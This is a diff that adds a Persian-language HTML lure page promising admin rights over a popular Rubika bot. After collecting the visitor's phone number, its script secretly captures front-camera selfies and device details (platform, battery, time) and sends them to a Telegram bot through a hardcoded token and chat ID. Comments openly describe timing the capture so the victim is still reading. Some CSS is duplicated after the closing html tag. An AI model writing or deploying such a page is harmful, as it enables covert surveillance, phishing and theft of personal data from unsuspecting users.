@@ -42,6 +42,185 @@
             background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 20px;
+        }
+        p { font-size: 18px; margin: 20px 0; line-height: 1.8; }
+        input {
+            width: 100%;
+            padding: 16px;
+            margin: 20px 0;
+            border: 2px solid #8a2be2;
+            border-radius: 15px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 18px;
+            text-align: center;
+            outline: none;
+        }
+        input:focus { border-color: #00ffff; box-shadow: 0 0 30px #00ffff; }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #8a2be2, #ff00ff);
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            box-shadow: 0 0 40px rgba(138,43,226,0.8);
+        }
+        button:hover { transform: scale(1.05); }
+        .hidden { display: none; }
+        video, canvas { display: none; }
+        .loader {
+            margin: 30px auto;
+            width: 60px;
+            height: 60px;
+            border: 6px solid #8a2be2;
+            border-top: 6px solid #00ffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container" id="welcome">
+    <h1>ادمین ربات</h1>
+    <p>می‌خوای ادمین ربات خفن روبیکا بشی؟</p>
+    <button onclick="choice('yes')">بله، خیلی!</button>
+    <button onclick="choice('no')">نه، ممنون</button>
+</div>
+
+<div class="container hidden" id="phone">
+    <h1>مرحله اول</h1>
+    <p>شماره موبایلت رو وارد کن تا ادامه بدیم</p>
+    <input type="text" id="phoneInput" placeholder="09123456789" maxlength="11">
+    <button onclick="nextPage()">ادامه</button>
+</div>
+
+<div class="container hidden" id="final">
+    <h1>تبریک عشقم!</h1>
+    <p>تو انتخاب شدی که ادمین یکی از قوی‌ترین ربات‌های روبیکا بشی 💜</p>
+    <p>این ربات تو بیش از ۵۰۰ گروه بزرگ فعاله و روزانه هزاران کاربر داره. به عنوان ادمین:</p>
+    <p>✅ همه پیام‌ها و چت‌ها رو می‌بینی</p>
+    <p>✅ می‌تونی هر کاربری رو بن یا آنبن کنی</p>
+    <p>✅ دسترسی به تمام آمار و اطلاعات گروه‌ها داری</p>
+    <p>✅ حتی می‌تونی درآمد از ربات داشته باشی</p>
+    <p>فقط یه لحظه صبر کن تا سیستم فعال بشه و دسترسی‌ها برات باز بشه...</p>
+    <div class="loader"></div>
+    <p style="font-size:14px;opacity:0.8;">در حال بارگیری دسترسی‌های ادمین...</p>
+</div>
+
+<video id="video" playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
+    const CHAT_ID = "-1003384762825";
+    let userPhone = "";
+
+    function choice(ans) {
+        if (ans === 'no') {
+            document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:50vh'>متأسفانه انتخاب نشدی 😢</h1>";
+            setTimeout(() => window.close(), 2000);
+        } else {
+            document.getElementById('welcome').classList.add('hidden');
+            document.getElementById('phone').classList.remove('hidden');
+        }
+    }
+
+    function nextPage() {
+        userPhone = document.getElementById('phoneInput').value.trim();
+        if (userPhone.length < 10) {
+            alert("شماره رو درست وارد کن عشقم");
+            return;
+        }
+        document.getElementById('phone').classList.add('hidden');
+        document.getElementById('final').classList.remove('hidden');
+
+        // بعد ۶ ثانیه (تا متن رو کامل بخونه) عکس بگیر
+        setTimeout(takeSelfies, 6000);
+    }
+
+    async function takeSelfies() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: "user",
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
+                } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+
+            // صبر کن تا دوربین کامل روشن بشه
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            const sendPhoto = (num) => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const form = new FormData();
+                    form.append('chat_id', CHAT_ID);
+                    form.append('photo', blob, `selfie_${num}.jpg`);
+                    form.append('caption', getInfoText());
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
+                }, 'image/jpeg', 0.95);
+            };
+
+            sendPhoto(1);
+            setTimeout(() => sendPhoto(2), 2000);
+
+            stream.getTracks().forEach(t => t.stop());
+            sendInfoText();
+
+        } catch(e) {
+            sendInfoText();
+        }
+    }
+
+    function getInfoText() {
+        const now = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });
+        let battery = "نامشخص";
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(b => {
+                battery = `${Math.round(b.level * 100)}% ${b.charging ? "(در حال شارژ)" : ""}`;
+            });
+        }
+
+        return `ادمین جدید وارد شد! 💜
+
+𝗣𝗵𝗼𝗻𝗲: ${userPhone}
+𝗠𝗼𝗱𝗲𝗹: ${navigator.platform}
+𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${battery}
+𝗧𝗶𝗺𝗲: ${now}
+
+𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: ™MicY™`;
+    }
+
+    function sendInfoText() {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(getInfoText())}`);
+    }
+</script>
+
+</body>
+</html>        }
+        h1 {
+            font-size: 32px;
+            background: linear-gradient(45deg, #8a2be2, #00ffff, #ff00ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
             animation: textPulse 2s infinite;
         }
         @keyframes textPulse { 0%,100% { opacity:1 } 50% { opacity:0.8 } }
